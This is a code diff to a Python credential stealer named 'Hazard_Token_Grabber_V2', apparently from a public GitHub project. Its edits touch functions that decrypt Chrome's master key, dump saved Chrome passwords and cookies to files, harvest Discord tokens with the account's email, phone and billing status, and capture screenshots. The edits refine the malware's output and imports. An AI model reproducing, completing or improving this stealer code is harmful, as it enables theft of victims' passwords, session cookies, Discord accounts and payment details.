@@ -1,6 +1,5 @@
 import requests
 import os 
-import win32crypt 
 import shutil 
 import sqlite3 
 import zipfile 
@@ -9,6 +8,7 @@ import base64
 import psutil 
 import pyautogui
 
+from win32crypt import CryptUnprotectData
 from re import findall
 from datetime import datetime
 from Crypto.Cipher import AES
@@ -79,7 +79,7 @@ class Hazard_Token_Grabber_V2:
         local_state = json.loads(local_state)
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
-        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
     
     def decrypt_payload(self, cipher, payload):
@@ -101,7 +101,7 @@ class Hazard_Token_Grabber_V2:
     
     def grabPassword(self):
         master_key = self.get_master_key()
-        f = open (self.tempfolder+"\\Google Passwords.txt", "w")
+        f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         try:
@@ -130,7 +130,7 @@ class Hazard_Token_Grabber_V2:
 
     def grabCookies(self):
         master_key = self.get_master_key()
-        f = open (self.tempfolder+"\\Google Cookies.txt", "w")
+        f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
         try:
@@ -158,7 +158,7 @@ class Hazard_Token_Grabber_V2:
             pass
 
     def grabTokens(self):
-        f = open (self.tempfolder+"\\Discord Info.txt", "w+")
+        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         paths = {
             'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
@@ -248,7 +248,7 @@ class Hazard_Token_Grabber_V2:
 
                 billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                 
-                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nNitro Expires in: {days_left} day(s)\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
+                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nNitro Expires in: {days_left} day(s)\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
 
     def screenshot(self):
         image = pyautogui.screenshot()
